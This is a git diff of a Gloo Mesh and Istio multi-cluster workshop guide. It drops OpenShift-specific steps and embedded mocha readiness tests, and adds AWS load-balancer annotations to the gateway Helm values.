@@ -14,7 +14,7 @@ source ./scripts/assert.sh
 
 ## Table of Contents
 * [Introduction](#introduction)
-* [Lab 1 - Deploy the Kubernetes clusters manually](#Lab-1)
+* [Lab 1 - Setting up your Kubernetes Contexts](#Lab-1)
 * [Lab 2 - Deploy Istio](#Lab-2)
 * [Lab 3 - Deploy the Bookinfo demo app](#Lab-3)
 * [Lab 4 - Deploy the httpbin demo app](#Lab-4)
@@ -75,7 +75,7 @@ You can find more information about Gloo Mesh in the official documentation:
 
 
 
-## Lab 1 - Deploy the Kubernetes clusters manually <a name="Lab-1"></a>
+## Lab 1 - Setting up your Kubernetes Contexts <a name="Lab-1"></a>
 
 Set the context environment variables:
 
@@ -112,8 +112,6 @@ kubectl config use-context ${MGMT}
 
 
 We are going to deploy Istio using Helm, but there are several other options. You can find more information in the [Istio documentation](https://istio.io/latest/docs/setup/install/).
-Note that the few Openshift specific commands used in this lab are documented on the Istio website [here](https://istio.io/latest/docs/setup/platform-setup/openshift/).
-
 
 First of all, let's Download the Istio release 1.12.6:
 
@@ -122,38 +120,11 @@ export ISTIO_VERSION=1.12.6
 curl -L https://istio.io/downloadIstio | sh -
 ```
 
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-var chai = require('chai');
-var expect = chai.expect;
-chai.use(chaiExec);
-
-describe("istioctl version", () => {
-  it("version should be correct", () => {
-    let cli = chaiExec('./istio-1.12.6/bin/istioctl version --remote=false');
-
-    expect(cli).to.exit.with.code(0);
-    expect(cli).stdout.to.contain("1.12.6");
-    expect(cli).stderr.to.be.empty;
-  });
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/deploy-istio/tests/istio-version.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
 Then, you need to create the `istio-system` and the `istio-gateways` namespaces on the first cluster.
 
 ```bash
 kubectl --context ${CLUSTER1} create ns istio-system
 kubectl --context ${CLUSTER1} create ns istio-gateways
-```
-For Openshift clusters, you also need to run the following commands:
-
-```bash
-oc --context ${CLUSTER1} adm policy add-scc-to-group anyuid system:serviceaccounts:istio-system
-oc --context ${CLUSTER1} adm policy add-scc-to-group anyuid system:serviceaccounts:istio-gateways
 ```
 
 Now, let's deploy the Istio control plane on the first cluster:
@@ -187,41 +158,6 @@ pilot:
   env:
     PILOT_ENABLE_K8S_SELECT_WORKLOAD_ENTRIES: "false"
     PILOT_SKIP_VALIDATE_TRUST_DOMAIN: "true"
-istio_cni:
-  enabled: true
-sidecarInjectorWebhook:
-  injectedAnnotations:
-    k8s.v1.cni.cncf.io/networks: istio-cni
-EOF
-```
-For Openshift clusters, you need to deploy the `istio-cni` component and to create a run a `NetworkAttachmentDefinition` object:
-
-```bash
-helm --kube-context=${CLUSTER1} upgrade --install istio-cni -n kube-system ./istio-1.12.6/manifests/charts/istio-cni --values - <<EOF
-
-global:
-  hub: us-docker.pkg.dev/gloo-mesh/istio-workshops
-  tag: 1.12.6
-cni:
-  excludeNamespaces:
-    - istio-system
-    - kube-system
-    - metallb-system
-  repair:
-    enabled: false
-  logLevel: info
-  privileged: true
-  cniBinDir: /var/lib/cni/bin
-  cniConfDir: /etc/cni/multus/net.d
-  chained: false
-  cniConfFileName: istio-cni.conf
-EOF
-
-cat <<EOF | oc --context ${CLUSTER1} -n istio-gateways create -f -
-apiVersion: "k8s.cni.cncf.io/v1"
-kind: NetworkAttachmentDefinition
-metadata:
-  name: istio-cni
 EOF
 ```
 
@@ -242,12 +178,27 @@ gateways:
       istio: ingressgateway
     injectionTemplate: gateway
     ports:
+    - name: tcp-status-port
+      port: 15021
+      targetPort: 15021
     - name: http2
       port: 80
       targetPort: 8080
     - name: https
       port: 443
       targetPort: 8443
+    serviceAnnotations:
+      meta.helm.sh/release-name: istio-ingressgateway
+      meta.helm.sh/release-namespace: istio-gateways
+      service.beta.kubernetes.io/aws-load-balancer-backend-protocol: TCP
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-healthy-threshold: "2"
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-interval: "10"
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-port: "15021"
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-protocol: tcp
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-unhealthy-threshold: "2"
+      service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip
+      service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing
+      service.beta.kubernetes.io/aws-load-balancer-type: external
 EOF
 
 helm --kube-context=${CLUSTER1} upgrade --install istio-eastwestgateway ./istio-1.12.6/manifests/charts/gateways/istio-ingress -n istio-gateways --values - <<EOF
@@ -275,6 +226,18 @@ gateways:
     - name: tcp-webhook
       port: 15017
       targetPort: 15017
+    serviceAnnotations:
+      meta.helm.sh/release-name: istio-ingressgateway
+      meta.helm.sh/release-namespace: istio-gateways
+      service.beta.kubernetes.io/aws-load-balancer-backend-protocol: TCP
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-healthy-threshold: "2"
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-interval: "10"
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-port: "15021"
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-protocol: tcp
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-unhealthy-threshold: "2"
+      service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip
+      service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing
+      service.beta.kubernetes.io/aws-load-balancer-type: external
     env:
       ISTIO_META_ROUTER_MODE: "sni-dnat"
       ISTIO_META_REQUESTED_NETWORK_VIEW: "network1"
@@ -360,12 +323,27 @@ gateways:
       istio: ingressgateway
     injectionTemplate: gateway
     ports:
+    - name: tcp-status-port
+      port: 15021
+      targetPort: 15021
     - name: http2
       port: 80
       targetPort: 8080
     - name: https
       port: 443
       targetPort: 8443
+    serviceAnnotations:
+      meta.helm.sh/release-name: istio-ingressgateway
+      meta.helm.sh/release-namespace: istio-gateways
+      service.beta.kubernetes.io/aws-load-balancer-backend-protocol: TCP
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-healthy-threshold: "2"
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-interval: "10"
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-port: "15021"
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-protocol: tcp
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-unhealthy-threshold: "2"
+      service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip
+      service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing
+      service.beta.kubernetes.io/aws-load-balancer-type: external
 EOF
 
 helm --kube-context=${CLUSTER2} upgrade --install istio-eastwestgateway ./istio-1.12.6/manifests/charts/gateways/istio-ingress -n istio-gateways --values - <<EOF
@@ -393,87 +371,29 @@ gateways:
     - name: tcp-webhook
       port: 15017
       targetPort: 15017
+    serviceAnnotations:
+      meta.helm.sh/release-name: istio-ingressgateway
+      meta.helm.sh/release-namespace: istio-gateways
+      service.beta.kubernetes.io/aws-load-balancer-backend-protocol: TCP
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-healthy-threshold: "2"
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-interval: "10"
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-port: "15021"
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-protocol: tcp
+      service.beta.kubernetes.io/aws-load-balancer-healthcheck-unhealthy-threshold: "2"
+      service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip
+      service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing
+      service.beta.kubernetes.io/aws-load-balancer-type: external
     env:
       ISTIO_META_ROUTER_MODE: "sni-dnat"
       ISTIO_META_REQUESTED_NETWORK_VIEW: "network1"
 EOF
 ```
 
-<!--bash
-cat <<'EOF' > ./test.js
-
-const helpers = require('./tests/chai-exec');
-
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-const chai = require("chai");
-const expect = chai.expect;
-
-afterEach(function (done) {
-  if (this.currentTest.currentRetry() > 0) {
-    process.stdout.write(".");
-    setTimeout(done, 1000);
-  } else {
-    done();
-  }
-});
-
-describe("Checking Istio installation", function() {
-  let deployments = ["istiod-1-12"];
-  deployments.forEach(deploy => {
-    it(deploy + ' pods are ready in cluster ' + process.env.CLUSTER1, () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "istio-system", k8sObj: deploy }));
-  });
-  deployments = ["istio-eastwestgateway", "istio-ingressgateway"];
-  deployments.forEach(deploy => {
-    it(deploy + ' pods are ready in cluster ' + process.env.CLUSTER1, () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "istio-gateways", k8sObj: deploy }));
-  });
-  deployments = ["istiod-1-12"];
-  deployments.forEach(deploy => {
-    it(deploy + ' pods are ready in cluster ' + process.env.CLUSTER2, () => helpers.checkDeployment({ context: process.env.CLUSTER2, namespace: "istio-system", k8sObj: deploy }));
-  });
-  deployments = ["istio-eastwestgateway", "istio-ingressgateway"];
-  deployments.forEach(deploy => {
-    it(deploy + ' pods are ready in cluster ' + process.env.CLUSTER2, () => helpers.checkDeployment({ context: process.env.CLUSTER2, namespace: "istio-gateways", k8sObj: deploy }));
-  });
-  it("Ingress gateways have an ip attached in cluster " + process.env.CLUSTER1, () => {
-    let cli = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n istio-gateways get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer}'");
-    expect(cli).to.exit.with.code(0);
-    expect(cli).output.to.contain('"ingress"');
-    
-    cli = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n istio-gateways get svc istio-eastwestgateway -o jsonpath='{.status.loadBalancer}'");
-    expect(cli).to.exit.with.code(0);
-    expect(cli).output.to.contain('"ingress"');
-    
-  });
-  it("Ingress gateways have an ip attached in cluster " + process.env.CLUSTER2, () => {
-    let cli = chaiExec("kubectl --context " + process.env.CLUSTER2 + " -n istio-gateways get svc istio-eastwestgateway  -o jsonpath='{.status.loadBalancer}'");
-    expect(cli).to.exit.with.code(0);
-    expect(cli).output.to.contain('"ingress"');
-    cli = chaiExec("kubectl --context " + process.env.CLUSTER2 + " -n istio-gateways get svc istio-ingressgateway  -o jsonpath='{.status.loadBalancer}'");
-    expect(cli).to.exit.with.code(0);
-    expect(cli).output.to.contain('"ingress"');
-  });
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/deploy-istio/tests/istio-ready.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
 Check the status on the second cluster using:
 
 ```bash
 kubectl --context ${CLUSTER2} get pods -n istio-system && kubectl --context ${CLUSTER2} get pods -n istio-gateways
 ```
-Expose an OpenShift route for the ingress gateway on the first cluster:
-
-```bash
-oc --context ${CLUSTER1} -n istio-gateways expose svc/istio-ingressgateway --port=http2
-```
-<!--bash
-until [[ $(kubectl --context ${CLUSTER1} -n istio-gateways get svc istio-ingressgateway -o json | jq '.status.loadBalancer | length') -gt 0 ]]; do
-  sleep 1
-done
--->
 
 Set the environment variable for the service corresponding to the Istio Ingress Gateway of the cluster(s):
 
@@ -486,86 +406,17 @@ export ENDPOINT_HTTPS_GW_CLUSTER2=$(kubectl --context ${CLUSTER2} -n istio-gatew
 export HOST_GW_CLUSTER2=$(echo ${ENDPOINT_HTTP_GW_CLUSTER2} | cut -d: -f1)
 ```
 
-<!--bash
-cat <<'EOF' > ./test.js
-const dns = require('dns');
-const chaiHttp = require("chai-http");
-const chai = require("chai");
-const expect = chai.expect;
-chai.use(chaiHttp);
-const { waitOnFailedTest } = require('./tests/utils');
-
-afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});
-
-describe("Address '" + process.env.HOST_GW_CLUSTER1 + "' can be resolved in DNS", () => {
-    it(process.env.HOST_GW_CLUSTER1 + ' can be resolved', (done) => {
-        return dns.lookup(process.env.HOST_GW_CLUSTER1, (err, address, family) => {
-            expect(address).to.be.an.ip;
-            done();
-        });
-    });
-});
-EOF
-echo "executing test ./gloo-mesh/tests/can-resolve.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-<!--bash
-cat <<'EOF' > ./test.js
-const dns = require('dns');
-const chaiHttp = require("chai-http");
-const chai = require("chai");
-const expect = chai.expect;
-chai.use(chaiHttp);
-const { waitOnFailedTest } = require('./tests/utils');
-
-afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});
-
-describe("Address '" + process.env.HOST_GW_CLUSTER2 + "' can be resolved in DNS", () => {
-    it(process.env.HOST_GW_CLUSTER2 + ' can be resolved', (done) => {
-        return dns.lookup(process.env.HOST_GW_CLUSTER2, (err, address, family) => {
-            expect(address).to.be.an.ip;
-            done();
-        });
-    });
-});
-EOF
-echo "executing test ./gloo-mesh/tests/can-resolve.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
-
-
 ## Lab 3 - Deploy the Bookinfo demo app <a name="Lab-3"></a>
-
-
 
 We're going to deploy the bookinfo application to demonstrate several features of Istio and Gloo Mesh.
 
 You can find more information about this application [here](https://istio.io/latest/docs/examples/bookinfo/).
-Note that the few Openshift specific commands used in this lab are documented on the Istio website [here](https://istio.io/latest/docs/setup/platform-setup/openshift/).
 
 Run the following commands to deploy the bookinfo application on `cluster1`:
 
 ```bash
 kubectl --context ${CLUSTER1} create ns bookinfo-frontends
 kubectl --context ${CLUSTER1} create ns bookinfo-backends
-oc --context ${CLUSTER1} adm policy add-scc-to-group anyuid system:serviceaccounts:bookinfo-frontends
-oc --context ${CLUSTER1} adm policy add-scc-to-group anyuid system:serviceaccounts:bookinfo-backends
-
-cat <<EOF | oc --context ${CLUSTER1} -n bookinfo-frontends create -f -
-apiVersion: "k8s.cni.cncf.io/v1"
-kind: NetworkAttachmentDefinition
-metadata:
-  name: istio-cni
-EOF
-
-cat <<EOF | oc --context ${CLUSTER1} -n bookinfo-backends create -f -
-apiVersion: "k8s.cni.cncf.io/v1"
-kind: NetworkAttachmentDefinition
-metadata:
-  name: istio-cni
-EOF
-
 curl https://raw.githubusercontent.com/istio/istio/1.12.6/samples/bookinfo/platform/kube/bookinfo.yaml -s|sed 's/docker\.io\/istio/us-central1-docker\.pkg\.dev\/solo-test-236622\/jmunozro/g'|tee bookinfo.yaml
 kubectl --context ${CLUSTER1} label namespace bookinfo-frontends istio.io/rev=1-12
 kubectl --context ${CLUSTER1} label namespace bookinfo-backends istio.io/rev=1-12
@@ -645,44 +496,11 @@ reviews-v1-79d546878f-b7tpw   2/2     Running   0          84s
 
 As you can see, we deployed all three versions of the `reviews` microservice on this cluster.
 
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-exec');
-
-describe("Bookinfo app", () => {
-  let cluster = process.env.CLUSTER1
-  let deployments = ["productpage-v1"];
-  deployments.forEach(deploy => {
-    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "bookinfo-frontends", k8sObj: deploy }));
-  });
-  deployments = ["ratings-v1", "details-v1", "reviews-v1", "reviews-v2"];
-  deployments.forEach(deploy => {
-    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "bookinfo-backends", k8sObj: deploy }));
-  });
-  cluster = process.env.CLUSTER2
-  deployments = ["productpage-v1"];
-  deployments.forEach(deploy => {
-    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "bookinfo-frontends", k8sObj: deploy }));
-  });
-  deployments = ["ratings-v1", "details-v1", "reviews-v1", "reviews-v2", "reviews-v3"];
-  deployments.forEach(deploy => {
-    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "bookinfo-backends", k8sObj: deploy }));
-  });
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/bookinfo/deploy-bookinfo/tests/check-bookinfo.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
-
-
-
 ## Lab 4 - Deploy the httpbin demo app <a name="Lab-4"></a>
 
 We're going to deploy the httpbin application to demonstrate several features of Istio and Gloo Mesh.
 
 You can find more information about this application [here](http://httpbin.org/).
-Note that the few Openshift specific commands used in this lab are documented on the Istio website [here](https://istio.io/latest/docs/setup/platform-setup/openshift/).
 
 Run the following commands to deploy the httpbin app on `cluster1` twice.
 
@@ -690,16 +508,6 @@ The first version will be called `not-in-mesh` and won't have the sidecar inject
 
 ```bash
 kubectl --context ${CLUSTER1} create ns httpbin
-
-
-oc --context ${CLUSTER1} adm policy add-scc-to-group anyuid system:serviceaccounts:httpbin
-
-cat <<EOF | oc --context ${CLUSTER1} -n httpbin create -f -
-apiVersion: "k8s.cni.cncf.io/v1"
-kind: NetworkAttachmentDefinition
-metadata:
-  name: istio-cni
-EOF
 
 kubectl --context ${CLUSTER1} apply -n httpbin -f - <<EOF
 apiVersion: v1
@@ -811,27 +619,7 @@ in-mesh-5d9d9549b5-qrdgd       2/2     Running   0          11s
 not-in-mesh-5c64bb49cd-m9kwm   1/1     Running   0          11s
 ```
 
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-exec');
-
-describe("Bookinfo app", () => {
-  let cluster = process.env.CLUSTER1
-  let deployments = ["not-in-mesh", "in-mesh"];
-  deployments.forEach(deploy => {
-    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "httpbin", k8sObj: deploy }));
-  });
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/httpbin/deploy-httpbin/tests/check-httpbin.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
-
-
 ## Lab 5 - Deploy and register Gloo Mesh <a name="Lab-5"></a>
-
-
 
 First of all, let's install the `meshctl` CLI:
 
@@ -842,36 +630,6 @@ export PATH=$HOME/.gloo-mesh/bin:$PATH
 ```
 
 Run the following commands to deploy the Gloo Mesh management plane:
-
-<!--bash
-cat <<'EOF' > ./test.js
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("Required environment variables should contain value", () => {
-  afterEach(function(done){
-    if(this.currentTest.currentRetry() > 0){
-      process.stdout.write(".");
-       setTimeout(done, 1000);
-    } else {
-      done();
-    }
-  });
-
-  it("Context environment variables should not be empty", () => {
-    expect(process.env.MGMT).to.not.be.empty
-    expect(process.env.CLUSTER1).to.not.be.empty
-    expect(process.env.CLUSTER2).to.not.be.empty
-  });
-
-  it("Gloo Mesh licence environment variables should not be empty", () => {
-    expect(process.env.GLOO_MESH_LICENSE_KEY).to.not.be.empty
-  });
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/deploy-and-register-gloo-mesh/tests/environment-variables.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
 
 ```bash
 helm repo add gloo-mesh-enterprise https://storage.googleapis.com/gloo-mesh-enterprise/gloo-mesh-enterprise 
@@ -886,25 +644,8 @@ helm upgrade --install gloo-mesh-enterprise gloo-mesh-enterprise/gloo-mesh-enter
 --set licenseKey=${GLOO_MESH_LICENSE_KEY}
 kubectl --context ${MGMT} -n gloo-mesh rollout status deploy/gloo-mesh-mgmt-server
 ```
-<!--bash
-kubectl wait --context ${MGMT} --for=condition=Ready -n gloo-mesh --all pod
-until [[ $(kubectl --context ${MGMT} -n gloo-mesh get svc gloo-mesh-mgmt-server -o json | jq '.status.loadBalancer | length') -gt 0 ]]; do
-  sleep 1
-done
--->
 
 Then, you need to set the environment variable to tell the Gloo Mesh agents how to communicate with the management plane:
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-var chai = require('chai');
-var expect = chai.expect;
-chai.use(chaiExec);
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/deploy-and-register-gloo-mesh/tests/get-gloo-mesh-mgmt-server-ip.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
 
 ```bash
 export ENDPOINT_GLOO_MESH=$(kubectl --context ${MGMT} -n gloo-mesh get svc gloo-mesh-mgmt-server -o jsonpath='{.status.loadBalancer.ingress[0].*}'):9900
@@ -916,29 +657,6 @@ Check that the variables have correct values:
 echo $HOST_GLOO_MESH
 echo $ENDPOINT_GLOO_MESH
 ```
-<!--bash
-cat <<'EOF' > ./test.js
-const dns = require('dns');
-const chaiHttp = require("chai-http");
-const chai = require("chai");
-const expect = chai.expect;
-chai.use(chaiHttp);
-const { waitOnFailedTest } = require('./tests/utils');
-
-afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});
-
-describe("Address '" + process.env.HOST_GLOO_MESH + "' can be resolved in DNS", () => {
-    it(process.env.HOST_GLOO_MESH + ' can be resolved', (done) => {
-        return dns.lookup(process.env.HOST_GLOO_MESH, (err, address, family) => {
-            expect(address).to.be.an.ip;
-            done();
-        });
-    });
-});
-EOF
-echo "executing test ./gloo-mesh/tests/can-resolve.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
 
 Finally, you need to register the cluster(s).
 
@@ -976,7 +694,6 @@ helm upgrade --install gloo-mesh-agent gloo-mesh-agent/gloo-mesh-agent \
   --set rate-limiter.enabled=false \
   --set ext-auth-service.enabled=false \
   --set cluster=cluster1 \
-  --set glooMeshAgent.floatingUserId=true \
   --version 2.0.0-beta33
 ```
 
@@ -1032,30 +749,6 @@ relay_push_clients_connected{cluster="cluster1"} 1
 relay_push_clients_connected{cluster="cluster2"} 1
 ```
 
-<!--bash
-cat <<'EOF' > ./test.js
-var chai = require('chai');
-var expect = chai.expect;
-const helpers = require('./tests/chai-exec');
-
-describe("Cluster registration", () => {
-  it("cluster1 is registered", () => {
-    podName = helpers.getOutputForCommand({ command: "kubectl -n gloo-mesh get pods -l app=gloo-mesh-mgmt-server -o jsonpath='{.items[0].metadata.name}' --context " + process.env.MGMT }).replaceAll("'", "");
-    command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.MGMT + " -n gloo-mesh debug -q -i " + podName + " --image=curlimages/curl -- curl -s http://localhost:9091/metrics" }).replaceAll("'", "");
-    expect(command).to.contain("cluster1");
-  });
-  it("cluster2 is registered", () => {
-    podName = helpers.getOutputForCommand({ command: "kubectl -n gloo-mesh get pods -l app=gloo-mesh-mgmt-server -o jsonpath='{.items[0].metadata.name}' --context " + process.env.MGMT }).replaceAll("'", "");
-    command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.MGMT + " -n gloo-mesh debug -q -i " + podName + " --image=curlimages/curl -- curl -s http://localhost:9091/metrics" }).replaceAll("'", "");
-    expect(command).to.contain("cluster2");
-  });
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/deploy-and-register-gloo-mesh/tests/cluster-registration.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
-
 To use the Gloo Mesh Gateway advanced features (external authentication, rate limiting, ...), you need to install the Gloo Mesh addons.
 
 First, you need to create a namespace for the addons, with Istio injection enabled:
@@ -1065,14 +758,6 @@ kubectl --context ${CLUSTER1} create namespace gloo-mesh-addons
 kubectl --context ${CLUSTER1} label namespace gloo-mesh-addons istio.io/rev=1-12
 kubectl --context ${CLUSTER2} create namespace gloo-mesh-addons
 kubectl --context ${CLUSTER2} label namespace gloo-mesh-addons istio.io/rev=1-12
-oc --context ${CLUSTER1} adm policy add-scc-to-group anyuid system:serviceaccounts:gloo-mesh-addons
-
-cat <<EOF | oc --context ${CLUSTER1} -n gloo-mesh-addons create -f -
-apiVersion: "k8s.cni.cncf.io/v1"
-kind: NetworkAttachmentDefinition
-metadata:
-  name: istio-cni
-EOF
 ```
 
 Then, you can deploy the addons on the cluster(s) using Helm:
@@ -1084,7 +769,6 @@ helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
   --set glooMeshAgent.enabled=false \
   --set rate-limiter.enabled=true \
   --set ext-auth-service.enabled=true \
-  --set glooMeshAgent.floatingUserId=true \
   --version 2.0.0-beta33
 
 helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
@@ -1330,18 +1014,6 @@ Get the URL to access the `productpage` service using the following command:
 echo "http://${ENDPOINT_HTTP_GW_CLUSTER1}/productpage"
 ```
 
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-http');
-
-describe("Productpage is available (HTTP)", () => {
-  it('/productpage is available in cluster1', () => helpers.checkURL({ host: 'http://' + process.env.ENDPOINT_HTTP_GW_CLUSTER1, path: '/productpage', retCode: 200 }));
-})
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/bookinfo/gateway-expose/tests/productpage-available.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
 Gloo Mesh translates the `VirtualGateway` and `RouteTable` into the corresponding Istio objects (`Gateway` and `VirtualService`).
 
 Now, let's secure the access through TLS.
@@ -1394,38 +1066,11 @@ spec:
 EOF
 ```
 
-If your Kubernetes cluster is running on AWS, the Load Balancer created for the Service Type Load Balancer corresponding to the Istio Ingress Gateway has a health check port configured to use the HTTP port.
-
-Gloo Mesh is now configuring the Istio Ingress Gateway to listen on HTTPS, so in that case you need to patch the Kubernetes Service as follow.
-
-```bash
-cat << EOF > svc-patch.yaml
-spec:
-  ports:
-  - port: 80
-    targetPort: 8443
-EOF
-
-kubectl --context ${CLUSTER2} patch -n istio-gateways svc istio-ingressgateway -p "$(cat svc-patch.yaml)"
-```
-
 You can now access the `productpage` application securely through the browser.
 Get the URL to access the `productpage` service using the following command:
 ```
 echo "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/productpage"
 ```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-http');
-
-describe("Productpage is available (HTTPS)", () => {
-  it('/productpage is available in cluster1', () => helpers.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/productpage', retCode: 200 }));
-})
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/bookinfo/gateway-expose/tests/productpage-available-secure.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
 
 This diagram shows the flow of the request (through the Istio Ingress Gateway):
 
@@ -1552,43 +1197,6 @@ spec:
               version: v2
 EOF
 ```
-
-<!--bash
-cat <<'EOF' > ./test.js
-var chai = require('chai');
-var expect = chai.expect;
-const chaiHttp = require("chai-http");
-chai.use(chaiHttp);
-
-process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
-
-afterEach(function (done) {
-  if (this.currentTest.currentRetry() > 0) {
-    process.stdout.write(".");
-    setTimeout(done, 1000);
-  } else {
-    done();
-  }
-});
-
-let searchTest="Sorry, product reviews are currently unavailable for this book.";
-
-describe("Reviews shouldn't be available", () => {
-  it("Checking text '" + searchTest + "' in cluster1", async () => {
-    await chai.request('https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1)
-      .get('/productpage')
-      .send()
-      .then((res) => {
-        expect(res.text).to.contain(searchTest);
-      });
-  });
-
-});
-
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/bookinfo/traffic-policies/tests/traffic-policies-reviews-unavailable.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
 
 If you refresh the page several times, you'll see an error message telling that reviews are unavailable when the productpage is trying to communicate with the version `v2` of the `reviews` service.
 
@@ -1794,24 +1402,6 @@ Have a look at the `RootTrustPolicy` object we've just created and notice the `a
 
 In recent versions of Istio, the control plane is able to pick up this new cert without any restart, but we would need to wait for the different Pods to renew their certificates (which happens every hour by default).
 
-<!--bash
-printf "\nWaiting until the secret is created in $CLUSTER1"
-until kubectl --context ${CLUSTER1} get secret -n istio-system cacerts &>/dev/null
-do
-  printf "%s" "."
-  sleep 1
-done
-printf "\n"
-
-printf "\nWaiting until the secret is created in $CLUSTER2"
-until kubectl --context ${CLUSTER2} get secret -n istio-system cacerts &>/dev/null
-do
-  printf "%s" "."
-  sleep 1
-done
-printf "\n"
--->
-
 Now, let's check what certificates we get when we run the same commands we ran before we created the Root Trust Policy:
 
 ```
@@ -1897,44 +1487,6 @@ s4v2pEvaYg==
 -----END CERTIFICATE-----
 ...
 ```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-var chai = require('chai');
-var expect = chai.expect;
-chai.use(chaiExec);
-
-afterEach(function (done) {
-  if (this.currentTest.currentRetry() > 0) {
-    process.stdout.write(".");
-    setTimeout(done, 1000);
-  } else {
-    done();
-  }
-});
-
-describe("Certificate issued by Gloo Mesh", () => {
-  var expectedOutput = "i:O = gloo-mesh";
-  
-  it('Gloo mesh is the organization for ' + process.env.CLUSTER1 + ' certificate', () => {
-    let cli = chaiExec("kubectl --context " + process.env.CLUSTER1 + " exec -t -n bookinfo-backends deploy/reviews-v1 -c istio-proxy -- openssl s_client -showcerts -connect ratings:9080 -alpn istio");
-
-    expect(cli).stdout.to.contain(expectedOutput);
